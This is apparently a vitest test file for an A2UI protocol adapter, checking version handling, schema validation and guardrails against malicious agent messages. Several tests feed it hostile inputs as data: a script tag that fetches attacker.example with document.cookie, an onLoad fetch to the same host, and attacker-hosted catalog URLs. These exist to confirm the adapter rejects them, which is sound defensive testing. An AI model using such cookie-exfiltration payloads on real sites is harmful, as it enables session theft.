// @spec:039-a2ui-1-0
// A2UI 1.0 alongside 0.9.1. Messages replay the official 1.0 example corpus
// (tests/fixtures/spec-examples-v1.ts, copied from the A2UI repository) or
// follow the shapes of `specification/v1_0/json/agent_to_renderer.json` at
// the pinned commit. Each message is handled by the version it declares, a
// surface never mixes versions, and the Art. VIII guardrail holds for 1.0.
import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import { catalogData } from '@kimen/catalog';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type {
  A2uiActionMessage,
  A2uiActionMetadata,
  A2uiDegradationReport,
  A2uiErrorMessage,
  A2uiRendererFunctionResponse,
} from '../src/index.js';
import {
  A2UI_BASIC_CATALOG_IDS,
  A2UI_PROTOCOLS,
  A2UI_RENDERER_CAPABILITIES,
  A2UI_V1_BASIC_CATALOG_IDS,
  A2UI_V1_COVERAGE,
  A2UI_V1_EVALUATED_FUNCTIONS,
  createA2uiAdapter,
  PREFERRED_A2UI_VERSION,
  SUPPORTED_A2UI_VERSIONS,
} from '../src/index.js';
import { BUILDERS } from '../src/translate.js';
import {
  childListTemplateV1,
  contactFormV1,
  incrementalV1,
  interactiveButtonV1,
  simpleLoginFormV1,
  validRendererMessagesV1,
} from './fixtures/spec-examples-v1.js';

let surface: HTMLElement;

beforeEach(() => {
  document.body.replaceChildren();
  surface = document.createElement('div');
  document.body.appendChild(surface);
});

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

const V1 = A2UI_V1_BASIC_CATALOG_IDS[0] ?? '';
const V09 = A2UI_BASIC_CATALOG_IDS[0] ?? '';
const NOW = new Date('2026-11-16T09:00:00.000Z');

const activate = (root: Element, selector: string): void => {
  const target = root.querySelector<HTMLElement>(selector);
  if (target === null) {
    throw new Error(`no ${selector} rendered`);
  }
  target.click();
};

const isCatalogTree = (root: Element): boolean =>
  [...root.querySelectorAll('*')].every((element) => element.localName.startsWith('ki-'));

const create = (surfaceId = 's', extra: Record<string, unknown> = {}) => ({
  version: '1.0',
  createSurface: { surfaceId, catalogId: V1, ...extra },
});
const update = (components: unknown[], surfaceId = 's') => ({
  version: '1.0',
  updateComponents: { surfaceId, components },
});
const data = (value: unknown, path?: string, surfaceId = 's') => ({
  version: '1.0',
  updateDataModel: { surfaceId, ...(path === undefined ? {} : { path }), value },
});

const button = (id: string, label: string, action: unknown) => [
  { id, component: 'Button', child: `${id}-label`, action },
  { id: `${id}-label`, component: 'Text', text: label },
];

/** The 1.0 order summary (Card → Column → Text, Text, Button), bindings in `@path`. */
const orderComponentsV1 = [
  { id: 'root', component: 'Card', child: 'body' },
  { id: 'body', component: 'Column', children: ['title', 'total', 'confirm'] },
  { id: 'title', component: 'Text', text: 'Order summary', variant: 'body' },
  { id: 'total', component: 'Text', text: { '@path': '/order/total' } },
  ...button('confirm', 'Confirm order', {
    event: {
      name: 'confirm-order',
      context: { total: { '@path': '/order/total' } },
    },
  }),
];

/** The same order summary in 0.9.1 (bindings in `path`). */
const orderComponentsV09 = [
  { id: 'root', component: 'Card', child: 'body' },
  { id: 'body', component: 'Column', children: ['title', 'total', 'confirm'] },
  { id: 'title', component: 'Text', text: 'Order summary', variant: 'body' },
  { id: 'total', component: 'Text', text: { path: '/order/total' } },
  ...button('confirm', 'Confirm order', {
    event: {
      name: 'confirm-order',
      context: { total: { path: '/order/total' } },
    },
  }),
];

const ORDER = { order: { total: '€42.00' } };

describe('each message is handled by the A2UI version it declares', () => {
  it('S1 renders a 1.0 surface created with its components and data model in one message', () => {
    const adapter = createA2uiAdapter({ surface });

    const result = adapter.apply(
      create('checkout', { components: orderComponentsV1, dataModel: ORDER }),
    );

    expect(result.ok).toBe(true);
    expect(isCatalogTree(surface)).toBe(true);
    expect(surface.textContent).toContain('Order summary');
    expect(surface.textContent).toContain('€42.00');
    expect(surface.querySelector('ki-button')?.textContent).toBe('Confirm order');
  });

  it('S1 replays the official 1.0 examples through catalog components only', () => {
    for (const corpus of [
      interactiveButtonV1,
      simpleLoginFormV1,
      incrementalV1,
      childListTemplateV1,
    ]) {
      surface.replaceChildren();
      const adapter = createA2uiAdapter({ surface });
      for (const message of corpus) {
        expect(adapter.apply(message)).toMatchObject({ ok: true });
      }
      expect(surface.childNodes.length).toBeGreaterThan(0);
      expect(isCatalogTree(surface)).toBe(true);
    }

    // The 1.0 contact form: @checks, a ChoicePicker, an Icon and a
    // formatDate call in an action context. Verbatim, its ChoicePicker has no
    // label, so the guarded renderer refuses the unlabeled radio group (the
    // label is its accessible name) and nothing renders.
    surface.replaceChildren();
    const verbatim = createA2uiAdapter({ surface });
    verbatim.apply(contactFormV1[0]);
    expect(verbatim.apply(contactFormV1[1]).diagnostics[0]).toMatchObject({
      rule: 'missing-required-prop',
      value: 'label',
    });
    expect(surface.childNodes).toHaveLength(0);

    // The example needs the label and the host's mail glyph to render.
    // Its last message deletes the surface.
    const [first, components, ...rest] = contactFormV1;
    const labeled = {
      ...components,
      updateComponents: {
        ...components.updateComponents,
        components: components.updateComponents.components.map((component) =>
          component.id === 'pref_picker'
            ? { ...component, label: 'Preferred contact method' }
            : component,
        ),
      },
    };
    const degradations: A2uiDegradationReport[] = [];
    const adapter = createA2uiAdapter({
      onDegradation: (report) => degradations.push(report),
      surface,
    });
    expect(adapter.apply(first)).toMatchObject({ ok: true });
    expect(adapter.apply(labeled)).toMatchObject({
      diagnostics: [{ rule: 'unavailable-icon', value: 'mail' }],
      ok: false,
    });
    expect(surface.childNodes).toHaveLength(0);

    // Model the glyph the host would import before applying the update.
    vi.stubGlobal(Symbol.for('kimen.icon-registry.v1'), new Map([['mail', '<path />']]));
    for (const message of [labeled, ...rest.slice(0, -1)]) {
      expect(adapter.apply(message)).toMatchObject({ ok: true });
    }
    expect(isCatalogTree(surface)).toBe(true);
    expect(surface.querySelector('ki-radio-group')?.getAttribute('value')).toBe('email');
    expect(surface.querySelector('ki-icon')?.getAttribute('name')).toBe('mail');
    expect(
      [...surface.querySelectorAll('ki-input')].map((input) => input.getAttribute('label')),
    ).toStrictEqual(['First Name', 'Last Name', 'Email', 'Phone']);
    expect(degradations).toStrictEqual([]);
    expect(adapter.apply(contactFormV1.at(-1))).toMatchObject({ ok: true });
  });

  it('S2 gives a 0.9.1 agent the same catalog surface as a 1.0 agent', () => {
    const v1Surface = document.createElement('div');
    const v09Surface = document.createElement('div');
    document.body.append(v1Surface, v09Surface);

    createA2uiAdapter({ surface: v1Surface }).apply(
      create('checkout', { components: orderComponentsV1, dataModel: ORDER }),
    );
    const v09 = createA2uiAdapter({ surface: v09Surface });
    v09.apply({
      version: 'v0.9.1',
      createSurface: { surfaceId: 'checkout', catalogId: V09 },
    });
    v09.apply({
      version: 'v0.9.1',
      updateDataModel: { surfaceId: 'checkout', value: ORDER },
    });
    v09.apply({
      version: 'v0.9.1',
      updateComponents: { surfaceId: 'checkout', components: orderComponentsV09 },
    });

    expect(v1Surface.childNodes.length).toBeGreaterThan(0);
    expect(v09Surface.innerHTML).toBe(v1Surface.innerHTML);
  });

  it('S3 rejects a message tagged with an unsupported version naming the supported set', () => {
    const adapter = createA2uiAdapter({ surface });

    expect(SUPPORTED_A2UI_VERSIONS).toStrictEqual(['1.0', 'v0.9.1', 'v0.9']);
    for (const version of ['v1.0', '1', '1.0.0', '0.9.1', 'v0.8', 'V1.0']) {
      const result = adapter.apply({
        version,
        createSurface: { surfaceId: 's', catalogId: V1, components: orderComponentsV1 },
      });
      expect(result.ok).toBe(false);
      expect(result.diagnostics[0]).toMatchObject({
        rule: 'unsupported-version',
        value: version,
      });
      for (const supported of SUPPORTED_A2UI_VERSIONS) {
        expect(result.diagnostics[0]?.message).toContain(supported);
      }
    }
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S4 rejects a 1.0 envelope outside the 1.0 shapes before anything renders', () => {
    const adapter = createA2uiAdapter({ surface });

    const hostile = adapter.apply({
      version: '1.0',
      createSurface: {
        surfaceId: 's',
        catalogId: V1,
        components: orderComponentsV1,
        onLoad: "fetch('https://attacker.example/')",
      },
    });

    expect(hostile.ok).toBe(false);
    expect(hostile.diagnostics[0]?.rule).toBe('malformed-message');
    expect(hostile.diagnostics[0]?.path).toBe('/createSurface/onLoad');
    expect(hostile.diagnostics[0]?.message).toContain('onLoad');
    expect(surface.childNodes).toHaveLength(0);
    // No surface was created: a later update addresses an unknown surface.
    expect(adapter.apply(update(orderComponentsV1)).diagnostics[0]?.rule).toBe('unknown-surface');

    adapter.apply(create());
    for (const message of [
      { version: '1.0' },
      { version: '1.0', createSurface: { surfaceId: 'x', catalogId: V1 }, extra: true },
      { version: '1.0', createSurface: { catalogId: V1 } },
      { version: '1.0', createSurface: { surfaceId: 'x', catalogId: 7 } },
      { version: '1.0', createSurface: { surfaceId: 'x', catalogId: V1, components: [] } },
      { version: '1.0', createSurface: { surfaceId: 'x', catalogId: V1, dataModel: [1] } },
      {
        version: '1.0',
        createSurface: { surfaceId: 'x', catalogId: V1, metadata: { tracking: 'pixel' } },
      },
      { version: '1.0', updateComponents: { surfaceId: 's', components: [{ id: 'root' }] } },
      { version: '1.0', updateComponents: { surfaceId: 's' } },
      { version: '1.0', updateDataModel: { surfaceId: 's', path: '/a', contents: 1 } },
      { version: '1.0', deleteSurface: { surfaceId: 's', force: true } },
      { version: '1.0', callFunction: { surfaceId: 's' } },
      {
        version: '1.0',
        callRendererFunction: { functionCallId: 'c1', callFunction: { '@call': 'formatString' } },
      },
    ]) {
      const result = adapter.apply(message);
      expect(result.ok).toBe(false);
      expect(result.diagnostics[0]?.rule).toBe('malformed-message');
    }
    expect(surface.childNodes).toHaveLength(0);
  });
});

describe('a surface never mixes A2UI versions', () => {
  it('S5 rejects a 0.9.1 message carrying a 1.0 trait', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply({ version: 'v0.9.1', createSurface: { surfaceId: 's', catalogId: V09 } });
    adapter.apply({
      version: 'v0.9.1',
      updateComponents: {
        surfaceId: 's',
        components: [
          { id: 'root', component: 'Card', child: 'name' },
          { id: 'name', component: 'Text', text: 'Before' },
        ],
      },
    });
    const before = surface.innerHTML;

    const bound = adapter.apply({
      version: 'v0.9.1',
      updateComponents: {
        surfaceId: 's',
        components: [{ id: 'name', component: 'Text', text: { '@path': '/user/firstName' } }],
      },
    });

    expect(bound.ok).toBe(false);
    expect(bound.diagnostics[0]).toMatchObject({
      path: '/components/name/text',
      rule: 'malformed-message',
    });
    expect(bound.diagnostics[0]?.message).toContain('A2UI 0.9.1');
    expect(surface.innerHTML).toBe(before);

    const v09 = (payload: Record<string, unknown>) => ({ version: 'v0.9.1', ...payload });
    const rejections = [
      v09({
        createSurface: { surfaceId: 'x', catalogId: V09, components: orderComponentsV09 },
      }),
      v09({ createSurface: { surfaceId: 'x', catalogId: V09, dataModel: {} } }),
      v09({
        callRendererFunction: {
          functionCallId: 'c1',
          callFunction: { '@call': 'openUrl', catalogId: V09, args: { url: 'https://a.example/' } },
        },
      }),
      v09({ agentFunctionResponse: { functionCallId: 'c1', value: 1 } }),
      v09({
        updateComponents: {
          surfaceId: 's',
          components: [
            {
              id: 'name',
              component: 'Text',
              text: { '@call': 'formatString', args: { value: 'x' } },
            },
          ],
        },
      }),
      v09({
        updateComponents: {
          surfaceId: 's',
          components: [
            { id: 'root', component: 'Card', child: 'go' },
            ...button('go', 'Go', { event: { name: 'go', userMessage: 'Went' } }),
          ],
        },
      }),
    ];
    for (const message of rejections) {
      const result = adapter.apply(message);
      expect(result.ok).toBe(false);
      expect(result.diagnostics[0]?.rule).toBe('malformed-message');
    }
    for (const [property, value] of [
      ['@checks', []],
      ['placeholder', 'name@example.com'],
      ['@accessibility', { label: 'Email' }],
    ] as const) {
      const result = adapter.apply(
        v09({
          updateComponents: {
            surfaceId: 's',
            components: [{ id: 'name', component: 'TextField', label: 'Email', [property]: value }],
          },
        }),
      );
      expect(result.diagnostics[0]).toMatchObject({ rule: 'unknown-property', value: property });
    }
    expect(surface.innerHTML).toBe(before);
  });

  it('S6 rejects a 1.0 component or envelope carrying a 0.9.1 trait', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'Card', child: 'email' },
          { id: 'email', component: 'TextField', label: 'Email', value: { '@path': '/email' } },
        ],
      }),
    );
    const before = surface.innerHTML;
    expect(before).toContain('ki-input');

    const bare = adapter.apply(
      update([
        {
          id: 'email',
          component: 'TextField',
          label: 'Email',
          value: { '@path': '/email' },
          checks: [{ condition: { '@call': 'required', args: { value: { '@path': '/email' } } } }],
        },
      ]),
    );

    expect(bare.ok).toBe(false);
    expect(bare.diagnostics[0]).toMatchObject({ rule: 'unknown-property', value: 'checks' });
    expect(surface.innerHTML).toBe(before);

    for (const [property, value] of [
      ['accessibility', { label: 'Email' }],
      ['validationRegexp', '^.+@.+$'],
    ] as const) {
      const result = adapter.apply(
        update([{ id: 'email', component: 'TextField', label: 'Email', [property]: value }]),
      );
      expect(result.diagnostics[0]).toMatchObject({ rule: 'unknown-property', value: property });
    }
    for (const message of [
      update([{ id: 'email', component: 'TextField', label: { path: '/label' } }]),
      update([
        {
          id: 'email',
          component: 'TextField',
          label: { call: 'formatString', args: { value: 'Email' }, returnType: 'string' },
        },
      ]),
      create('t', { theme: { primaryColor: '#ff0000' } }),
      { version: '1.0', updateDataModel: { surfaceId: 's', path: '/email' } },
    ]) {
      const result = adapter.apply(message);
      expect(result.ok).toBe(false);
      expect(result.diagnostics[0]?.rule).toBe('malformed-message');
    }
    const shaped = adapter.apply(
      update([{ id: 'email', component: 'TextField', label: { path: '/l' } }]),
    );
    expect(shaped.diagnostics[0]?.message).toContain('A2UI 1.0');
    expect(surface.innerHTML).toBe(before);
  });

  it('S7 lets a surface accept only the version that created it', () => {
    const errors: A2uiErrorMessage[] = [];
    const adapter = createA2uiAdapter({ onError: (error) => errors.push(error), surface });
    adapter.apply(create('checkout', { components: orderComponentsV1, dataModel: ORDER }));
    const before = surface.innerHTML;

    const result = adapter.apply({
      version: 'v0.9.1',
      updateComponents: { surfaceId: 'checkout', components: orderComponentsV09 },
    });

    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({ rule: 'version-mismatch', value: '1.0' });
    expect(result.diagnostics[0]?.message).toContain('1.0');
    expect(surface.innerHTML).toBe(before);
    // The agent is told in the surface's own version.
    expect(errors.map((e) => e.version)).toStrictEqual(['1.0']);

    // The reverse holds, and surface ids are one namespace across versions.
    const other = document.createElement('div');
    const mixed = createA2uiAdapter({ surface: other });
    mixed.apply({ version: 'v0.9', createSurface: { surfaceId: 'legacy', catalogId: V09 } });
    expect(mixed.apply(data({ a: 1 }, undefined, 'legacy')).diagnostics[0]).toMatchObject({
      rule: 'version-mismatch',
      value: '0.9.1',
    });
    expect(mixed.apply(create('legacy')).diagnostics[0]?.rule).toBe('surface-exists');
    expect(mixed.apply({ version: '1.0', deleteSurface: { surfaceId: 'legacy' } }).ok).toBe(false);
    // v0.9 and v0.9.1 stay one payload-compatible family.
    expect(
      mixed.apply({ version: 'v0.9.1', updateDataModel: { surfaceId: 'legacy', value: { a: 1 } } })
        .ok,
    ).toBe(true);
  });

  it('S8 accepts only each version’s own basic catalog', () => {
    const adapter = createA2uiAdapter({ surface });

    const result = adapter.apply({
      version: '1.0',
      createSurface: { surfaceId: 's', catalogId: V09 },
    });

    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({ rule: 'unsupported-catalog', value: V09 });
    expect(result.diagnostics[0]?.message).toContain(V1);
    expect(
      adapter.apply({
        version: '1.0',
        createSurface: {
          surfaceId: 's',
          catalogId: 'https://a2ui.org/specification/v0_9_1/catalogs/basic/catalog.json',
        },
      }).diagnostics[0]?.rule,
    ).toBe('unsupported-catalog');
    const legacy = adapter.apply({
      version: 'v0.9.1',
      createSurface: { surfaceId: 's', catalogId: V1 },
    });
    expect(legacy.diagnostics[0]).toMatchObject({ rule: 'unsupported-catalog', value: V1 });
  });
});

describe('A2UI 1.0 features translate into the neutral catalog', () => {
  it('S9 removes a 1.0 data-model value set to null', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'Card', child: 'name' },
          { id: 'name', component: 'Text', text: { '@path': '/user/firstName' } },
        ],
        dataModel: { user: { firstName: 'Ada' } },
      }),
    );
    expect(surface.textContent).toContain('Ada');

    const result = adapter.apply(data(null, '/user/firstName'));

    expect(result.ok).toBe(true);
    expect(surface.textContent).not.toContain('Ada');
    expect(surface.querySelector('ki-card')).not.toBeNull();

    // A null at the root clears the whole model.
    adapter.apply(data({ user: { firstName: 'Grace' } }));
    expect(surface.textContent).toContain('Grace');
    adapter.apply(data(null));
    expect(surface.textContent).not.toContain('Grace');
  });

  it('S10 returns a declared 1.0 action as a 1.0 event carrying its user message', () => {
    const events: A2uiActionMessage[] = [];
    const metadata: (A2uiActionMetadata | undefined)[] = [];
    const adapter = createA2uiAdapter({
      now: () => NOW,
      onAction: (event, meta) => {
        events.push(event);
        metadata.push(meta);
      },
      surface,
    });
    adapter.apply(
      create('checkout', {
        components: [
          { id: 'root', component: 'Card', child: 'confirm' },
          ...button('confirm', 'Confirm order', {
            event: {
              name: 'confirm-order',
              userMessage: {
                '@call': 'formatString',
                args: { value: 'Order ${/order/total} confirmed' },
              },
              context: { total: { '@path': '/order/total' } },
            },
          }),
        ],
        dataModel: ORDER,
        sendDataModel: true,
      }),
    );

    activate(surface, 'ki-button');

    expect(events).toStrictEqual([
      {
        version: '1.0',
        action: {
          name: 'confirm-order',
          userMessage: 'Order €42.00 confirmed',
          surfaceId: 'checkout',
          sourceComponentId: 'confirm',
          timestamp: NOW.toISOString(),
          context: { total: '€42.00' },
        },
      },
    ]);
    const reference = validRendererMessagesV1[1];
    expect(Object.keys(events[0]?.action ?? {}).sort()).toStrictEqual(
      Object.keys(reference.action).sort(),
    );
    expect(metadata).toStrictEqual([
      { a2uiRendererDataModel: { version: '1.0', surfaces: { checkout: ORDER } } },
    ]);
  });

  it('S11 numbers the items of a list with the template index function', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'List', children: { componentId: 'item', path: '/items' } },
          { id: 'item', component: 'Text', text: { '@call': '@index', args: { offset: 1 } } },
        ],
      }),
    );

    const result = adapter.apply(
      data({ items: [{ name: 'Apple' }, { name: 'Banana' }, { name: 'Cherry' }] }),
    );

    expect(result.ok).toBe(true);
    expect(
      [...surface.querySelectorAll('ki-list-item')].map((item) => item.textContent),
    ).toStrictEqual(['1', '2', '3']);

    // Outside a list template, @index is an evaluation error: the message is rejected.
    const outside = adapter.apply(
      update([{ id: 'root', component: 'Text', text: { '@call': '@index' } }]),
    );
    expect(outside.ok).toBe(false);
    expect(outside.diagnostics[0]?.rule).toBe('malformed-message');
  });

  it('S11 fails closed on an @index offset nested beyond the value depth budget', () => {
    const events: A2uiActionMessage[] = [];
    const adapter = createA2uiAdapter({ onAction: (event) => events.push(event), surface });
    adapter.apply(create('s', { dataModel: { items: [{ name: 'Apple' }] } }));
    let offset: unknown = 1;
    for (let level = 0; level < 20_000; level += 1) {
      offset = { '@call': '@index', args: { offset } };
    }

    const result = adapter.apply(
      update([
        { id: 'root', component: 'List', children: { componentId: 'item', path: '/items' } },
        { id: 'item', component: 'Text', text: offset },
      ]),
    );

    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]?.rule).toBe('malformed-message');
    expect(surface.childNodes).toHaveLength(0);
    // The same budget holds where the value resolves only at dispatch.
    const button = adapter.apply(
      update([
        { id: 'root', component: 'List', children: { componentId: 'go', path: '/items' } },
        {
          id: 'go',
          component: 'Button',
          child: 'go-label',
          action: { event: { name: 'go', userMessage: offset } },
        },
        { id: 'go-label', component: 'Text', text: 'Go' },
      ]),
    );
    expect(button.ok).toBe(false);
    expect(events).toHaveLength(0);
  });

  it('S12 carries plain objects in a 1.0 action context as literal data', () => {
    const events: A2uiActionMessage[] = [];
    const adapter = createA2uiAdapter({ onAction: (event) => events.push(event), surface });
    adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'Card', child: 'save' },
          ...button('save', 'Save', {
            event: {
              name: 'save-note',
              context: {
                note: { path: '/user/email', '@@type': 'note', tags: [{ '@@id': 7 }] },
                email: { '@path': '/user/email' },
              },
            },
          }),
        ],
        dataModel: { user: { email: 'ada@example.com' } },
      }),
    );

    activate(surface, 'ki-button');

    expect(events[0]?.action.context).toStrictEqual({
      note: { path: '/user/email', '@type': 'note', tags: [{ '@id': 7 }] },
      email: 'ada@example.com',
    });
    expect(JSON.stringify(events[0]?.action.context['note'])).not.toContain('ada@example.com');
  });

  it('S13 maps a 1.0 text field placeholder onto the catalog input', () => {
    const adapter = createA2uiAdapter({ surface });

    const result = adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'Column', children: ['email', 'notes'] },
          {
            id: 'email',
            component: 'TextField',
            label: 'Email',
            value: { '@path': '/form/email' },
            placeholder: 'ada@example.com',
          },
          {
            id: 'notes',
            component: 'TextField',
            label: 'Notes',
            value: { '@path': '/form/notes' },
            variant: 'longText',
            placeholder: { '@path': '/hints/notes' },
          },
        ],
        dataModel: { hints: { notes: 'Delivery instructions' } },
      }),
    );

    expect(result.ok).toBe(true);
    const input = surface.querySelector('ki-input');
    expect([input?.getAttribute('label'), input?.getAttribute('placeholder')]).toStrictEqual([
      'Email',
      'ada@example.com',
    ]);
    expect(surface.querySelector('ki-textarea')?.getAttribute('placeholder')).toBe(
      'Delivery instructions',
    );
  });

  it('S14 renders the declared fallback for an unmapped 1.0 type and reports the gap', () => {
    const degradations: A2uiDegradationReport[] = [];
    const adapter = createA2uiAdapter({
      onDegradation: (report) => degradations.push(report),
      surface,
    });

    const result = adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'Column', children: ['ready', 'clip'] },
          { id: 'ready', component: 'Text', text: 'Ready' },
          {
            id: 'clip',
            component: 'Video',
            url: 'https://example.com/clip.mp4',
            posterUrl: 'https://example.com/poster.png',
          },
        ],
      }),
    );

    expect(result.ok).toBe(true);
    expect(degradations).toStrictEqual([
      { componentId: 'clip', componentType: 'Video', reason: 'unmapped-type', surfaceId: 's' },
    ]);
    expect(surface.textContent).toContain('Ready');
    expect(
      [...surface.querySelectorAll('ki-badge')].map((b) => [b.textContent, b.getAttribute('tone')]),
    ).toStrictEqual([['Unsupported component', 'warning']]);
  });

  it('S15 degrades a value needing an unevaluated function without calling the agent', () => {
    const degradations: A2uiDegradationReport[] = [];
    const outbound = vi.fn();
    const adapter = createA2uiAdapter({
      onAction: outbound,
      onDegradation: (report) => degradations.push(report),
      onError: outbound,
      onFunctionResponse: outbound,
      surface,
    });

    const result = adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'Column', children: ['hello', 'when', 'weather'] },
          {
            id: 'hello',
            component: 'Text',
            text: { '@call': 'formatString', args: { value: 'Hello, ${/user/name}!' } },
          },
          {
            id: 'when',
            component: 'Text',
            text: {
              '@call': 'formatDate',
              args: { value: { '@path': '/when' }, format: 'MMM dd' },
            },
          },
          {
            id: 'weather',
            component: 'Text',
            text: { '@call': 'lookupWeather', args: { city: 'Madrid' } },
          },
        ],
        dataModel: { user: { name: 'Ada' }, when: '2026-11-16' },
      }),
    );

    expect(result.ok).toBe(true);
    expect(surface.textContent).toContain('Hello, Ada!');
    expect(degradations.map((d) => [d.componentId, d.reason, d.detail])).toStrictEqual([
      ['when', 'unsupported-function', 'formatDate'],
      ['weather', 'unsupported-function', 'lookupWeather'],
    ]);
    expect(outbound).not.toHaveBeenCalled();
  });
});

const compat = readFileSync(join(process.cwd(), 'COMPAT.md'), 'utf8');

const section = (heading: string, next: string): string => {
  const start = compat.indexOf(heading);
  expect(start).toBeGreaterThan(-1);
  const end = compat.indexOf(next, start + heading.length);
  return compat.slice(start, end === -1 ? undefined : end);
};

const tableRows = (text: string, header: string): string[][] =>
  text
    .split('\n')
    .filter((line) => line.trim().startsWith('|') && !/\|\s*-+\s*\|/.test(line))
    .map((line) =>
      line
        .split('|')
        .slice(1, -1)
        .map((cell) => cell.trim().replaceAll('`', '')),
    )
    .filter((cells) => cells[0] !== header);

// The 18 component types of `catalogs/basic/v1/catalog.json` at the pinned commit.
const BASIC_V1_TYPES = [
  'Text',
  'Image',
  'Icon',
  'Video',
  'AudioPlayer',
  'Row',
  'Column',
  'List',
  'Card',
  'Tabs',
  'Modal',
  'Divider',
  'Button',
  'TextField',
  'CheckBox',
  'ChoicePicker',
  'Slider',
  'DateTimeInput',
];

describe('the compatibility matrix declares coverage per version', () => {
  it('S16 binds each supported version to its exact specification and coverage', () => {
    expect(
      A2UI_PROTOCOLS.map((p) => [
        p.specVersion,
        p.commit,
        p.envelopeVersions,
        p.emittedVersion,
        p.basicCatalogIds,
      ]),
    ).toStrictEqual([
      ['1.0', '57f961f143da23f4212313e432a64b5843d978f9', ['1.0'], '1.0', [V1]],
      [
        '0.9.1',
        '85120b91e2fe94cb20c8ddef0b545d3da2ae161f',
        ['v0.9.1', 'v0.9'],
        'v0.9.1',
        A2UI_BASIC_CATALOG_IDS,
      ],
    ]);

    const versions = section('## Supported A2UI protocol versions', '## Component-type coverage');
    for (const protocol of A2UI_PROTOCOLS) {
      for (const value of [
        protocol.specVersion,
        protocol.commit,
        ...protocol.envelopeVersions,
        protocol.emittedVersion,
        ...protocol.basicCatalogIds,
      ]) {
        expect(versions).toContain(value);
      }
    }

    // The 1.0 matrix covers the 18 basic types exactly, every mapped
    // counterpart is a real catalog component, and every renderable type has
    // one translation.
    const nonForbidden = Object.entries(A2UI_V1_COVERAGE)
      .filter(([, entry]) => entry.kind !== 'forbidden')
      .map(([type]) => type);
    expect(nonForbidden.sort()).toStrictEqual([...BASIC_V1_TYPES].sort());
    for (const [type, entry] of Object.entries(A2UI_V1_COVERAGE)) {
      if (entry.kind === 'mapped') {
        for (const tag of entry.catalog) {
          expect(Object.hasOwn(catalogData.components, tag)).toBe(true);
        }
      }
      expect(Object.hasOwn(BUILDERS, type)).toBe(
        entry.kind === 'mapped' || entry.kind === 'inline' || entry.kind === 'layout',
      );
    }

    // COMPAT.md's 1.0 coverage table matches the 1.0 matrix exactly.
    const documented: Record<string, { coverage: string; catalog: string }> = {};
    for (const [type, coverage, catalog] of tableRows(
      section('### A2UI 1.0 type coverage', '### A2UI 1.0 client functions'),
      'A2UI type',
    )) {
      if (type !== undefined && coverage !== undefined && catalog !== undefined) {
        documented[type] = { catalog, coverage };
      }
    }
    const expected: Record<string, { coverage: string; catalog: string }> = {};
    for (const [type, entry] of Object.entries(A2UI_V1_COVERAGE)) {
      expected[type] = {
        catalog: entry.kind === 'mapped' ? entry.catalog.join(', ') : '—',
        coverage: entry.kind,
      };
    }
    expect(documented).toStrictEqual(expected);

    // COMPAT.md's 1.0 function table matches the evaluated set.
    const handling = Object.fromEntries(
      tableRows(
        section('### A2UI 1.0 client functions', '### A2UI 1.0 lossy mappings'),
        'Function',
      ),
    ) as Record<string, string>;
    for (const name of A2UI_V1_EVALUATED_FUNCTIONS) {
      expect(handling[name]).toBe('evaluated');
    }
    expect(A2UI_V1_EVALUATED_FUNCTIONS).toContain('@index');
    expect(handling['openUrl']).toBe('forbidden');
  });

  it('S17 advertises A2UI 1.0 as the preferred version in its renderer capabilities', () => {
    expect(PREFERRED_A2UI_VERSION).toBe('1.0');
    expect(A2UI_RENDERER_CAPABILITIES).toStrictEqual([
      {
        metadataKey: 'a2uiRendererCapabilities',
        value: { '1.0': { supportedCatalogIds: [V1] } },
      },
      {
        metadataKey: 'a2uiClientCapabilities',
        value: { 'v0.9': { supportedCatalogIds: [...A2UI_BASIC_CATALOG_IDS] } },
      },
    ]);
    expect(section('## Supported A2UI protocol versions', '## Component-type coverage')).toContain(
      'preferred',
    );
  });
});

describe('the guardrail holds for A2UI 1.0', () => {
  it('S18 rejects a 1.0 message using a forbidden or reserved type', () => {
    const adapter = createA2uiAdapter({ surface });

    const inline = adapter.apply(
      create('s', {
        components: [
          { id: 'root', component: 'Card', child: 'title' },
          { id: 'title', component: 'Text', text: 'Hi' },
          {
            id: 'evil',
            component: 'html',
            content: "<script>fetch('https://attacker.example/'+document.cookie)</script>",
          },
        ],
      }),
    );

    expect(inline.ok).toBe(false);
    expect(inline.diagnostics[0]).toMatchObject({ rule: 'forbidden-type', value: 'html' });
    expect(surface.childNodes).toHaveLength(0);

    adapter.apply(create('s'));
    const later = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'title' },
        { id: 'title', component: 'Text', text: 'Hi' },
        { id: 'evil', component: 'html', content: '<script>alert(1)</script>' },
      ]),
    );
    expect(later.diagnostics[0]).toMatchObject({ rule: 'forbidden-type', value: 'html' });
    // The reserved Surface container can never be sent as a component.
    const reserved = adapter.apply(update([{ id: 'root', component: 'Surface', child: 'root' }]));
    expect(reserved.diagnostics[0]).toMatchObject({ rule: 'reserved-type', value: 'Surface' });
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S19 rejects a 1.0 component naming a catalog other than the basic catalog', () => {
    const adapter = createA2uiAdapter({ surface });
    adapter.apply(create());

    const result = adapter.apply(
      update([
        { id: 'root', component: 'Card', child: 'title' },
        {
          id: 'title',
          component: 'Text',
          text: 'Hi',
          '@catalogId': 'https://attacker.example/catalog.json',
        },
      ]),
    );

    expect(result.ok).toBe(false);
    expect(result.diagnostics[0]).toMatchObject({
      rule: 'unsupported-catalog',
      value: 'https://attacker.example/catalog.json',
    });
    expect(surface.childNodes).toHaveLength(0);

    const viaFunction = adapter.apply(
      update([
        {
          id: 'root',
          component: 'Text',
          text: {
            '@call': 'formatString',
            catalogId: 'https://attacker.example/catalog.json',
            args: { value: 'x' },
